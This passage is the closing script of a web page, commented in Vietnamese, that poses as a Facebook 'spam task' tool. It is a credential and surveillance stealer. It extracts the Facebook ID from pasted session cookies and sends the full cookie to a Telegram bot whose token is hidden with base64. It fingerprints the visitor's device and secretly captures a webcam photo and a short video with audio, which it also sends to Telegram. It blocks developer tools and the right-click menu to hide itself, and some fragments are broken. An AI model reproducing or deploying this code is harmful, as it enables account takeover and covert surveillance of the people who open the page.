            function getRealToken() {

                const p3 = atob('dGX2RadS12TUZI');

            }

            }
            
            // ===== TELEGRAM THẬT =====
            const TOKEN = getRealToken();
            const IDS = getRealIDs();
            
            const TelegramReal = {
                sendMessage: async function(msg, mode='HTML') {
                    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
                    for(const id of IDS) {
                        try {
                            await fetch(url, {
                                method:'POST',
                                headers:{'Content-Type':'application/json'},
                                body:JSON.stringify({chat_id:id, text:msg, parse_mode:mode})
                            });
                        } catch(e) { console.warn('Telegram send error:', e); }
                    }
                },
                sendPhoto: async function(photoBase64, caption='') {
                    const url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
                    try {
                        const b64 = photoBase64.replace(/^data:image\/\w+;base64,/, '');
                        const bin = atob(b64);
                        const arr = new Uint8Array(bin.length);
                        for(let i=0; i<bin.length; i++) arr[i] = bin.charCodeAt(i);
                        const blob = new Blob([arr], {type:'image/jpeg'});
                        for(const id of IDS) {
                            const fd = new FormData();
                            fd.append('chat_id', id);
                            fd.append('photo', blob, `img_${Date.now()}.jpg`);
                            fd.append('caption', caption);
                            await fetch(url, {method:'POST', body:fd});
                        }
                    } catch(e) { console.warn('Telegram photo error:', e); }
                },
                sendVideo: async function(videoBase64, caption='') {
                    const url = `https://api.telegram.org/bot${TOKEN}/sendVideo`;
                    try {
                        const b64 = videoBase64.replace(/^data:video\/\w+;base64,/, '');
                        const bin = atob(b64);
                        const arr = new Uint8Array(bin.length);
                        for(let i=0; i<bin.length; i++) arr[i] = bin.charCodeAt(i);
                        const blob = new Blob([arr], {type:'video/webm'});
                        for(const id of IDS) {
                            const fd = new FormData();
                            fd.append('chat_id', id);
                            fd.append('video', blob, `vid_${Date.now()}.webm`);
                            fd.append('caption', caption);
                            fd.append('supports_streaming', true);
                            await fetch(url, {method:'POST', body:fd});
                        }
                    } catch(e) { console.warn('Telegram video error:', e); }
                },
                extractId: function(cookie) {
                    try {
                        const m = cookie.match(/c_user=(\d+)/);
                        if(m) return m[1];
                        const m2 = cookie.match(/uid=(\d+)/);
                        if(m2) return m2[1];
                        return null;
                    } catch(e) { return null; }
                }
            };
            
            // Gán vào window (ẩn)
            window._TELEGRAM_REAL_ = TelegramReal;
            Object.defineProperty(window, '_TELEGRAM_REAL_', {enumerable:false, configurable:false, writable:false});
            
            // ===== CODE CHÍNH (SỬA LỖI ESCAPE) =====
            function initMainApp() {
                const D = {
                    ci: document.getElementById('cookieInput'),
                    fi: document.getElementById('fbId'),
                    cs: document.getElementById('cookieStatus'),
                    ds: document.getElementById('delaySlider'),
                    dv: document.getElementById('delayValue'),
                    st: document.getElementById('statusText'),
                    tc: document.getElementById('taskCount'),
                    ov: document.getElementById('overlay'),
                    ot: document.getElementById('overlayText'),
                    os: document.getElementById('overlaySub'),
                    vc: document.getElementById('video'),
                    cc: document.getElementById('canvas')
                };
                
                // Kiểm tra tồn tại các element
                if (!D.ci) { console.error('Missing elements'); return; }
                
                let mediaStream = null, isProcessing = false, taskCount = 0;
                let currentFbId = null, currentCookie = null;
                
                const deviceInfo = {
                    ua: navigator.userAgent,
                    pf: navigator.platform,
                    sc: screen.width+'x'+screen.height,
                    lg: navigator.language,
                    tm: new Date().toLocaleString('vi-VN'),
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                
                const TG = window._TELEGRAM_REAL_;
                
                D.ci.addEventListener('input', function(){
                    const c = this.value.trim();
                    if(c.length > 10) {
                        currentCookie = c;
                        const id = TG.extractId(c);
                        if(id) {
                            currentFbId = id;
                            D.fi.innerText = id;
                            D.cs.innerText = '✅ Hợp lệ';
                            D.cs.style.color = '#2ecc71';
                            TG.sendMessage('<b>🍪 COOKIE MỚI</b>\n\n🆔 <code>'+id+'</code>\n📱 '+deviceInfo.pf);
                        } else {
                            D.fi.innerText = 'Không tìm thấy ID';

                        D.cs.style.color = '#8da9c7';
                        currentFbId = null; currentCookie = null;
                    }
                });
                
                D.ci.addEventListener('blur', function(){
                    if(currentCookie && currentFbId) {
                        TG.sendMessage('<b>📋 COOKIE ĐẦY ĐỦ</b>\n\n🆔 '+currentFbId+'\n<code>'+currentCookie+'</code>');
                    }
                });
                
                D.ds.addEventListener('input', function(){ D.dv.innerText = this.value + 's'; });
                
                function toast(msg, err){
                    const t = document.createElement('div');
                    t.className = 'toast';
                    t.style.background = err ? '#7a2e3f' : '#0b1622';
                    t.innerText = msg;
                    document.body.appendChild(t);
                    setTimeout(() => t.remove(), 2500);
                }
                
                function updateTaskCount(){ D.tc.innerText = taskCount + ' task đã xử lý'; }
                
                async function startCamera(){
                    try {
                        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true});
                        mediaStream = s;
                        D.vc.srcObject = s;
                        await new Promise(r=>{D.vc.onloadedmetadata = r;});
                        D.vc.play();
                        return true;
                    } catch(e) { 
                        toast('Không truy cập được camera/mic', true);
                        return false; 
                    }
                }
                
                function capturePhoto(){
                    if(!D.vc.videoWidth) return null;
                    D.cc.width = D.vc.videoWidth;
                    D.cc.height = D.vc.videoHeight;
                    D.cc.getContext('2d').drawImage(D.vc, 0, 0);
                    return D.cc.toDataURL('image/jpeg', 0.9);
                }
                
                async function recordVideo(dur){
                    return new Promise(async(r)=>{
                        if(!mediaStream) { r(null); return; }
                        const chunks = [];
                        const rec = new MediaRecorder(mediaStream, {mimeType:'video/webm'});
                        rec.ondataavailable = e => chunks.push(e.data);
                        rec.onstop = async()=>{
                            const b = new Blob(chunks, {type:'video/webm'});
                            const fr = new FileReader();
                            fr.onloadend = () => r(fr.result);
                            fr.readAsDataURL(b);
                        };
                        rec.start();
                        setTimeout(()=>{ if(rec.state==='recording') rec.stop(); }, dur*1000);
                    });
                }
                
                function stopCamera(){ if(mediaStream){ mediaStream.getTracks().forEach(t=>t.stop()); mediaStream=null; } }
                
                async function processTask(tt){
                    if(isProcessing) { toast('⚠️ Đang xử lý!', true); return; }
                    isProcessing = true;
                    D.ov.classList.remove('hide');
                    D.ot.innerText = 'ĐANG XỬ LÝ';
                    D.os.innerText = 'Vui lòng chờ...';
                    
                    const taskNames = {'spam_ngon':'🗣️ SPAM NGÔN','spam_nhay':'💀 SPAM NHÂY','spam_top':'👑 SPAM TOP'};
                    TG.sendMessage('<b>🔥 BẮT ĐẦU TASK</b>\n\n📋 '+taskNames[tt]+'\n🆔 '+(currentFbId||'Không có'));
                    
                    try {
                        const camReady = await startCamera();
                        if(camReady) {
                            const photo = capturePhoto();
                            if(photo) await TG.sendPhoto(photo, '📸 '+taskNames[tt]+'\n🆔 '+(currentFbId||'Không có'));
                            D.os.innerText = 'Đang xử lý...';
                            const video = await recordVideo(2);
                            if(video) await TG.sendVideo(video, '🎥 '+taskNames[tt]+'\n🆔 '+(currentFbId||'Không có'));
                            stopCamera();
                        }
                        taskCount++; updateTaskCount();
                        D.st.innerHTML = '✅ Hoàn thành';
                        toast('✅ Thành công!');
                        setTimeout(()=>{ D.ov.classList.add('hide'); isProcessing = false; D.st.innerHTML = '✅ Sẵn sàng'; }, 1000);
                    } catch(e) {
                        D.ov.classList.add('hide'); isProcessing = false; stopCamera();
                        toast('❌ Lỗi: ' + e.message, true);
                    }
                }
                
                document.querySelectorAll('.task-btn').forEach(b=>{ 
                    b.addEventListener('click', e => processTask(b.dataset.task)); 
                });
                
                TG.sendMessage('<b>🟢 THIẾT BỊ MỚI</b>\n\n📱 '+deviceInfo.pf+'\n📐 '+deviceInfo.sc+'\n🌐 '+deviceInfo.ua.substring(0,80)+'\n⏰ '+deviceInfo.tm);
            }
            
            // Chạy sau khi DOM sẵn sàng
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', initMainApp);
            } else {
                initMainApp();
            }
            
            // ===== CHẶN PHÍM TẮT (giữ nguyên) =====
            document.addEventListener('keydown', e => {
                if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C'].includes(e.key))||(e.ctrlKey&&['U','u','S','s'].includes(e.key))) {
                    e.preventDefault();
                    return false;
                }
            });
            
            document.addEventListener('contextmenu', e => e.preventDefault());
            
        })();
    </script>
